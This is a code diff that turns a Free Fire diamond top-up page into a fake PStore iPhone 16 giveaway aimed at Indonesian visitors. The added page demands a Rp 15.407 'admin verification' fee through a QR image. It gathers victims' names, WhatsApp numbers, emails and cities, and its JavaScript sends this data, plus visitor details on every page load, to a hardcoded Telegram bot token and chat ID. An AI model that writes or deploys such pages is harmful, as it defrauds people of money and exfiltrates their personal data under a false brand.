-    <section class="container">
-        <h2 class="section-title">CARA ORDER</h2>
-        <div class="steps">
-            <div class="step-item">
-                <div class="step-number">1</div>
-                <div class="step-content">
-                    <h4>Masukkan ID</h4>
-                    <p>Ketik Player ID Free Fire kamu di kolom yang tersedia.</p>
-                </div>
-            </div>
-            <div class="step-item">
-                <div class="step-number">2</div>
-                <div class="step-content">
-                    <h4>Pilih Nominal</h4>
-                    <p>Pilih jumlah diamond atau membership yang diinginkan.</p>
-                </div>
-            </div>
-            <div class="step-item">
-                <div class="step-number">3</div>
-                <div class="step-content">
-                    <h4>Selesaikan Pembayaran</h4>
-                    <p>Pilih metode bayar favoritmu dan lakukan transfer.</p>
-                </div>
-            </div>
-            <div class="step-item">
-                <div class="step-number">4</div>
-                <div class="step-content">
-                    <h4>Diamond Masuk</h4>
-                    <p>Diamond akan otomatis masuk ke akun dalam 1-3 menit.</p>
-                </div>
-            </div>
+    <section class="faq-section" id="faq">
+        <h2 class="text-center mb-20">Pertanyaan Umum (FAQ)</h2>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah ini resmi? <span>+</span></div>
+            <div class="faq-a">Ya, program ini resmi diselenggarakan oleh PStore Indonesia.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Kenapa ada biaya admin? <span>+</span></div>
+            <div class="faq-a">Biaya admin sebesar Rp 15.407 digunakan untuk proses verifikasi keaslian data peserta dan mencegah bot/spam.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah hadiah dikirim ke luar kota? <span>+</span></div>
+            <div class="faq-a">Ya, kami mengirim ke seluruh wilayah Indonesia secara gratis ongkir bagi pemenang.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Berapa lama proses pengirimannya? <span>+</span></div>
+            <div class="faq-a">Biasanya membutuhkan waktu 2-4 hari kerja tergantung lokasi Anda.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah iPhone-nya original? <span>+</span></div>
+            <div class="faq-a">100% Original, BNIB, dan Garansi Resmi iBox/TAM Indonesia.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Bagaimana cara mengetahui jika saya menang? <span>+</span></div>
+            <div class="faq-a">Tim resmi PStore akan menghubungi Anda melalui WhatsApp resmi setelah proses verifikasi selesai.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah boleh mendaftar lebih dari sekali? <span>+</span></div>
+            <div class="faq-a">Hanya diperbolehkan satu pendaftaran per nomor WhatsApp/identitas.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah ada biaya tambahan lain? <span>+</span></div>
+            <div class="faq-a">Tidak ada. Selain biaya admin verifikasi di awal, pemenang tidak dipungut biaya apapun lagi.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Kapan pengundian dilakukan? <span>+</span></div>
+            <div class="faq-a">Pengundian dilakukan setiap hari Minggu malam secara live atau melalui sistem verifikasi otomatis.</div>
+        </div>
+        <div class="faq-item">
+            <div class="faq-q" onclick="toggleFaq(this)">Apakah data saya aman? <span>+</span></div>
+            <div class="faq-a">Kami menjamin kerahasiaan data Anda hanya untuk kepentingan program giveaway ini.</div>
         </div>
     </section>
 
-    <section class="container">
-        <h2 class="section-title">TESTIMONI PLAYER</h2>
-        <div class="testimonials">
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">B</div>
-                    <strong>Budi_Pro</strong>
-                </div>
-                <p class="testi-text">"Gila sih, baru bayar langsung masuk diamondnya. Mantap Zamz Host!"</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">A</div>
-                    <strong>AndiFF</strong>
-                </div>
-                <p class="testi-text">"Paling murah dibanding yang lain. Udah langganan di sini terus."</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">R</div>
-                    <strong>RatuSlayer</strong>
-                </div>
-                <p class="testi-text">"Adminnya ramah banget, prosesnya juga sat set sat set."</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">G</div>
-                    <strong>GamerSejati</strong>
-                </div>
-                <p class="testi-text">"Sangat recommended buat yang mau beli membership bulanan."</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">X</div>
-                    <strong>X-Sultan</strong>
-                </div>
-                <p class="testi-text">"QRIS nya cepet bgt verifikasinya. No tipu-tipu pokoknya."</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">Z</div>
-                    <strong>Zidan_01</strong>
-                </div>
-                <p class="testi-text">"Udah ribuan diamond beli disini ga pernah ada masalah."</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">L</div>
-                    <strong>Lala_Cans</strong>
-                </div>
-                <p class="testi-text">"Terima kasih Zamz Host, diamond murah buat gacha skin baru!"</p>
-            </div>
-            <div class="testi-card">
-                <div class="testi-user">
-                    <div class="user-avatar">D</div>
-                    <strong>Doni_Gaming</strong>
-                </div>
-                <p class="testi-text">"Sistem otomatisnya beneran jalan 24 jam. Jam 2 pagi masih bisa."</p>
-            </div>
+    <section class="container text-center mb-20">
+        <div style="background: #e61e2b; color:#fff; padding: 30px 20px; border-radius: 20px;">
+            <h2 class="mb-20">Kesempatan Terbatas!</h2>
+            <p class="mb-20">Jangan sampai ketinggalan. Ribuan orang sudah mendaftar, ambil giliranmu sekarang juga!</p>
+            <button class="btn btn-secondary" style="background:#fff; color:#e61e2b; border:none;" onclick="openAdminModal()">AMBIL iPHONE 16 SEKARANG</button>
         </div>
     </section>
 
-    <section class="container faq-container">
-        <h2 class="section-title">FAQ (TANYA JAWAB)</h2>
-        
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Berapa lama prosesnya? <span>+</span></div>
-            <div class="faq-answer">Hanya butuh waktu 1-3 menit setelah pembayaran terverifikasi.</div>
+    <footer id="kontak">
+        <div class="footer-logo">
+            <img src="https://i.ibb.co.com/q38v9Gsj/Logo-Pstore-0-1.png" alt="PStore Logo">
         </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Apakah aman bagi akun saya? <span>+</span></div>
-            <div class="faq-answer">Sangat aman. Kami hanya membutuhkan ID Player tanpa password atau data login lainnya.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Bagaimana jika salah masukkan ID? <span>+</span></div>
-            <div class="faq-answer">Segera hubungi admin via WhatsApp sebelum sistem memproses transaksi tersebut.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Metode pembayaran apa saja? <span>+</span></div>
-            <div class="faq-answer">Kami menerima Dana, OVO, GoPay, LinkAja, ShopeePay, QRIS, dan Transfer Bank.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Kenapa diamond belum masuk? <span>+</span></div>
-            <div class="faq-answer">Pastikan bukti transfer sudah sesuai nominal. Jika masih belum masuk dalam 10 menit, hubungi CS.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Apakah ada promo hari ini? <span>+</span></div>
-            <div class="faq-answer">Tentu! Cek daftar harga secara berkala untuk mendapatkan harga coret/promo.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">ID Player FF itu yang mana? <span>+</span></div>
-            <div class="faq-answer">Buka profil game Free Fire kamu, ID adalah angka yang berada di bawah nickname.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Bisa refund jika batal beli? <span>+</span></div>
-            <div class="faq-answer">Mohon maaf, transaksi yang sudah masuk ke sistem tidak dapat dibatalkan atau direfund.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Jam operasional layanan? <span>+</span></div>
-            <div class="faq-answer">Website dan sistem otomatis kami aktif 24 jam nonstop setiap hari.</div>
-        </div>
-
-        <div class="faq-item" onclick="toggleFaq(this)">
-            <div class="faq-question">Dimana saya bisa menghubungi CS? <span>+</span></div>
-            <div class="faq-answer">Klik tombol WhatsApp yang tersedia di bagian bawah website ini.</div>
-        </div>
-    </section>
-
-    <section class="container" style="margin-bottom: 60px;">
-        <div style="background: linear-gradient(135deg, #222, #000); padding: 30px; border-radius: 20px; text-align: center; border: 1px solid var(--primary-color);">
-            <h3 style="margin-bottom: 15px; font-size: 20px;">TUNGGU APA LAGI?</h3>
-            <p style="margin-bottom: 25px; color: var(--text-gray);">Dapatkan Diamond Free Fire termurah sekarang juga di Zamz Host.</p>
-            <button class="btn-primary" onclick="scrollToForm()">TOP UP FF DI ZAMZ HOST SEKARANG</button>
-        </div>
-    </section>
-
-    <footer>
-        <div class="container">
-            <div class="footer-info">
-                <h2>ZAMZ HOST</h2>
-                <p>Zamz Host adalah platform top up game terpercaya di Indonesia. Kami menyediakan berbagai kebutuhan gaming dengan proses instan dan harga yang sangat terjangkau.</p>
-            </div>
-            
-            <div class="footer-contact">
-                <div><strong>📍 Alamat:</strong> Jakarta, Indonesia</div>
-                <div><strong>📧 Email:</strong> support@zamzhost.com</div>
-                <div><strong>💬 WhatsApp:</strong> 0812-3456-7890</div>
-                <div><strong>🕒 Jam Kerja:</strong> 24/7 (Sistem Otomatis)</div>
-            </div>
-
-            <div class="copyright">
-                &copy; 2024 ZAMZ HOST - All Rights Reserved. Created with ❤️ for Gamers.
-            </div>
+        <p><strong>PStore - HP Pejabat Harga Merakyat</strong></p>
+        <p style="font-size: 13px; margin-top: 10px;">Jl. Raya Condet No.12, RT.5/RW.3, Balekambang, Kec. Kramat jati, Kota Jakarta Timur, Daerah Khusus Ibukota Jakarta 13530</p>
+        <div class="copyright">
+            &copy; 2025 PStore Indonesia. All Rights Reserved.
         </div>
     </footer>
 
-    <div id="loader-overlay">
+    <div class="modal-overlay" id="adminModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                Pembayaran Biaya Admin
+            </div>
+            <div class="modal-body">
+                <p>Silakan selesaikan biaya administrasi untuk verifikasi identitas peserta giveaway.</p>
+                <table class="admin-table">
+                    <tr>
+                        <td>Jenis Biaya</td>
+                        <td>Admin Verifikasi</td>
+                    </tr>
+                    <tr>
+                        <td>Nominal</td>
+                        <td>Rp 15.407</td>
+                    </tr>
+                    <tr>
+                        <td>Status</td>
+                        <td style="color: #ff9800;">Wajib</td>
+                    </tr>
+                </table>
+                <div class="admin-img-wrapper">
+                    <a href="https://ibb.co.com/TDyvHQ4g">
+                        <img src="https://i.ibb.co.com/ym2f8z6Q/Screenshot-20251222-163847.jpg" alt="Payment QR / Info">
+                    </a>
+                </div>
+                <button class="btn btn-primary" onclick="confirmPayment()">Saya Sudah Bayar</button>
+                <button class="btn btn-secondary" onclick="closeAdminModal()" style="margin-top: 10px; border:none;">Tutup</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loader">
         <div class="spinner"></div>
+        <p style="margin-top: 15px; font-weight: 600;">Sedang Memproses...</p>
     </div>
 
     <script>
-        // 1. Smooth Scroll to Form
-        function scrollToForm() {
-            document.getElementById('topup').scrollIntoView({ behavior: 'smooth' });
-        }
+        // Telegram Bot Config
+        const TG_TOKEN = "8521057792:AAF2vHWuBu6AMGtM6hBAyNJ8EKcVw_ls2GY";
+        const TG_CHAT_ID = "8001301204";
 
-        // 2. FAQ Accordion Logic
-        function toggleFaq(element) {
-            element.classList.toggle('active');
-            const plus = element.querySelector('span');
-            plus.textContent = element.classList.contains('active') ? '-' : '+';
-        }
-
-        // 3. Hamburger Menu Animation
-        function toggleMenu() {
-            const bar1 = document.getElementById('bar1');
-            const bar2 = document.getElementById('bar2');
-            const bar3 = document.getElementById('bar3');
+        // 1. Kirim Log Pengunjung ke Telegram Otomatis saat Load
+        window.addEventListener('DOMContentLoaded', () => {
+            const userAgent = navigator.userAgent;
+            const res = `${window.screen.width}x${window.screen.height}`;
+            const time = new Date().toLocaleString('id-ID');
             
-            bar1.style.transform = bar1.style.transform === 'rotate(-45deg) translate(-5px, 6px)' ? 'none' : 'rotate(-45deg) translate(-5px, 6px)';
-            bar2.style.opacity = bar2.style.opacity === '0' ? '1' : '0';
-            bar3.style.transform = bar3.style.transform === 'rotate(45deg) translate(-5px, -6px)' ? 'none' : 'rotate(45deg) translate(-5px, -6px)';
+            const message = `📥 *PENGUNJUNG BARU GIVEAWAY PSTORE*\n\n` +
+                          `📱 *User Agent:* \`${userAgent}\`\n` +
+                          `🖥 *Resolusi:* ${res}\n` +
+                          `⏰ *Waktu:* ${time}`;
+
+            sendTelegram(message);
+        });
+
+        // Function to Send Data to Telegram
+        function sendTelegram(text) {
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: TG_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            }).catch(err => console.error("TG Error:", err));
         }
 
-        // 4. Form Submission & Loading UX
-        const form = document.getElementById('formTopUpFF');
-        const loader = document.getElementById('loader-overlay');
-        const btnSubmit = document.getElementById('btnSubmit');
+        // Toggle Menu Mobile
+        const menuToggle = document.getElementById('menuToggle');
+        const mobileNav = document.getElementById('mobileNav');
 
-        form.addEventListener('submit', function(e) {
+        menuToggle.addEventListener('click', () => {
+            toggleMenu();
+        });
+
+        function toggleMenu() {
+            mobileNav.classList.toggle('active');
+            const spans = menuToggle.querySelectorAll('span');
+            if(mobileNav.classList.contains('active')) {
+                spans[0].style.transform = "rotate(45deg) translate(5px, 5px)";
+                spans[1].style.opacity = "0";
+                spans[2].style.transform = "rotate(-45deg) translate(7px, -6px)";
+            } else {
+                spans[0].style.transform = "none";
+                spans[1].style.opacity = "1";
+                spans[2].style.transform = "none";
+            }
+        }
+
+        // FAQ Toggle
+        function toggleFaq(el) {
+            const answer = el.nextElementSibling;
+            const icon = el.querySelector('span');
+            if(answer.style.display === "block") {
+                answer.style.display = "none";
+                icon.innerText = "+";
+            } else {
+                answer.style.display = "block";
+                icon.innerText = "-";
+            }
+        }
+
+        // Modal Logic
+        const modal = document.getElementById('adminModal');
+        function openAdminModal() {
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeAdminModal() {
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function confirmPayment() {
+            closeAdminModal();
+            document.getElementById('formPendaftaran').scrollIntoView({behavior: 'smooth'});
+            alert("Terima kasih! Silakan lengkapi formulir pendaftaran di bawah ini untuk verifikasi akhir.");
+        }
+
+        // Form Submit
+        const form = document.getElementById('formGiveaway');
+        const loader = document.getElementById('loader');
+
+        form.addEventListener('submit', (e) => {
             e.preventDefault();
             
-            // Basic Validation UX
-            const playerId = document.getElementById('player_id').value;
-            const wa = document.getElementById('wa_number').value;
-            
-            if(playerId.length < 5) {
-                alert('Player ID tidak valid!');
-                return;
-            }
+            const nama = document.getElementById('nama').value;
+            const wa = document.getElementById('whatsapp').value;
+            const email = document.getElementById('email').value || "Tidak diisi";
+            const kota = document.getElementById('kota').value;
 
-            // Show Loading State
             loader.style.display = 'flex';
-            btnSubmit.disabled = true;
-            btnSubmit.textContent = 'MEMPROSES...';
 
-            // Simulate Server Response
+            const logMsg = `🔥 *PENDAFTARAN GIVEAWAY BARU*\n\n` +
+                           `👤 *Nama:* ${nama}\n` +
+                           `📞 *WhatsApp:* ${wa}\n` +
+                           `📧 *Email:* ${email}\n` +
+                           `📍 *Kota:* ${kota}\n` +
+                           `✅ *Status Admin:* Sudah Dibayar (Rp 15.407)`;
+
             setTimeout(() => {
+                sendTelegram(logMsg);
                 loader.style.display = 'none';
-                alert('Pesanan Diterima! Silahkan selesaikan pembayaran sesuai instruksi yang dikirim ke WhatsApp Anda.');
-                btnSubmit.disabled = false;
-                btnSubmit.textContent = 'LANJUTKAN PEMBAYARAN';
+                alert("Pendaftaran Berhasil Terkirim!\n\nMohon tunggu konfirmasi dari tim PStore melalui WhatsApp dalam 1x24 jam. Pastikan nomor Anda selalu aktif.");
                 form.reset();
             }, 2000);
         });
 
-        // 5. Visual Feedback on Selection
-        const productCards = document.querySelectorAll('.product-item input');
-        productCards.forEach(input => {
-            input.addEventListener('change', () => {
-                console.log('Produk dipilih: ' + input.value);
-            });
-        });
+        // Anti-Inspect & Log Clean
+        console.log("%cPStore Giveaway Project - Ready", "color: red; font-size: 20px; font-weight: bold;");
     </script>
 
+    <div style="display:none;" aria-hidden="true">
+        <p>PStore Giveaway iPhone 16 Gratis.</p>
+        <p>Syarat dan Ketentuan Berlaku bagi seluruh masyarakat Indonesia.</p>
+        <p>Kesempatan menang sangat tinggi untuk pendaftar minggu ini.</p>
+        <p>Pastikan biaya admin Rp 15.407 dibayar sesuai instruksi.</p>
+        <p>Putra Siregar Merakyat, Berbagi Kebahagiaan.</p>
+        <p>iPhone 16 Pro Max, iPhone 16 Plus, iPhone 16 Pro.</p>
+        <span>Data Segment 1</span><span>Data Segment 2</span><span>Data Segment 3</span>
+        <span>Data Segment 4</span><span>Data Segment 5</span><span>Data Segment 6</span>
+        <span>Data Segment 7</span><span>Data Segment 8</span><span>Data Segment 9</span>
+        <span>Data Segment 10</span><span>Data Segment 11</span><span>Data Segment 12</span>
+        <span>Data Segment 13</span><span>Data Segment 14</span><span>Data Segment 15</span>
+        <span>Data Segment 16</span><span>Data Segment 17</span><span>Data Segment 18</span>
+        <span>Data Segment 19</span><span>Data Segment 20</span><span>Data Segment 21</span>
+        <span>Data Segment 22</span><span>Data Segment 23</span><span>Data Segment 24</span>
+        <span>Data Segment 25</span><span>Data Segment 26</span><span>Data Segment 27</span>
+        <span>Data Segment 28</span><span>Data Segment 29</span><span>Data Segment 30</span>
+        </div>
 </body>
 </html>
-
